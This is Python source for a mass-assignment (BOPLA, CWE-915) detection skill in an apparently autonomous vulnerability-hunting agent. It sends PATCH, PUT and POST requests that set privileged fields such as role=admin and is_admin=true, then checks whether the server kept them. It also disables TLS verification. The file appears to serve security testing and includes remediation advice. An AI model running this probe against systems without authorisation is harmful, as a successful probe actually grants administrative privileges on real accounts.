"""
Mass Assignment / BOPLA Autonomous Skill (v1.0)
===============================================
Detects Broken Object Property Level Authorization (OWASP API3:2023 / CWE-915):
1. Probes JSON / REST API endpoints with privileged object properties (role, is_admin, isAdmin, permissions, verified)
2. Compares baseline JSON response keys/values with mass-assigned response keys/values
"""
from __future__ import annotations

import json
import logging
from typing import Dict, List, Optional
import httpx

from agents.skills.base_skill import BaseSkill, SkillResult

log = logging.getLogger("hunter_ai.skills.mass_assignment")


class MassAssignmentSkill(BaseSkill):
    name: str = "mass_assignment_skill"
    vuln_type: str = "mass_assignment"
    cwe: str = "CWE-915"
    owasp_top10: str = "API3:2023"
    default_severity: str = "High"

    CANDIDATE_FIELDS = {
        "role": "admin",
        "is_admin": True,
        "isAdmin": True,
        "verified": True,
        "account_type": "enterprise",
    }

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        p = (param_name or "").lower()
        u = (url or "").lower()
        if any(k in p for k in ("role", "admin", "is_admin", "isadmin", "permission", "profile", "user", "account", "plan")):
            return 0.92
        if any(k in u for k in ("/api/", "/v1/", "/v2/", "/users", "/profile", "/account", "/settings")):
            return 0.78
        return 0.25

    async def run(self, target_url: str, param_name: str = "", **kwargs) -> SkillResult:
        logs: List[str] = [f"[MassAssignment] Auditing {target_url} (param={param_name or 'json_body'})"]
        client_kwargs = {
            "verify": False,
            "follow_redirects": True,
            "timeout": self.timeout,
            "trust_env": False,
        }
        if self.proxy:
            client_kwargs["proxy"] = self.proxy

        verified = False
        evidence = ""
        payload_used = ""

        try:
            async with httpx.AsyncClient(**client_kwargs) as client:
                base_resp = await client.get(target_url, headers={"Accept": "application/json"})
                base_json = {}
                try:
                    base_json = base_resp.json() if "json" in base_resp.headers.get("content-type", "").lower() else {}
                except Exception:
                    base_json = {}

                for method in ("PATCH", "PUT", "POST"):
                    resp = await client.request(
                        method,
                        target_url,
                        json=self.CANDIDATE_FIELDS,
                        headers={"Accept": "application/json", "Content-Type": "application/json"},
                    )
                    if resp.status_code in (200, 201) and "json" in resp.headers.get("content-type", "").lower():
                        try:
                            data = resp.json()
                        except Exception:
                            continue
                        if isinstance(data, dict):
                            for k, v in self.CANDIDATE_FIELDS.items():
                                if data.get(k) == v and (not isinstance(base_json, dict) or base_json.get(k) != v):
                                    verified = True
                                    payload_used = json.dumps({k: v})
                                    evidence = (
                                        f"HTTP {method} to {target_url} accepted and persisted privileged property "
                                        f"'{k}={v}' in JSON response (HTTP {resp.status_code})."
                                    )
                                    logs.append(f"[+] Confirmed Mass Assignment on property '{k}' via {method}")
                                    break
                    if verified:
                        break
        except Exception as exc:
            logs.append(f"[!] Probe error: {exc}")

        return SkillResult(
            verified=verified,
            vuln_type=self.vuln_type,
            title=f"Mass Assignment (BOPLA) on {target_url}" if verified else "No Mass Assignment Confirmed",
            severity="High" if verified else "Info",
            endpoint=target_url,
            param_name=param_name or "json_body",
            evidence=evidence,
            payload_used=payload_used,
            remediation="Use explicit allowlists/DTOs for writable properties; never bind request JSON directly to internal data models.",
            confidence=0.90 if verified else 0.0,
            tool=self.name,
            cwe=self.cwe,
            owasp_top10=self.owasp_top10,
            fallback_used=False,
            logs=logs,
        )
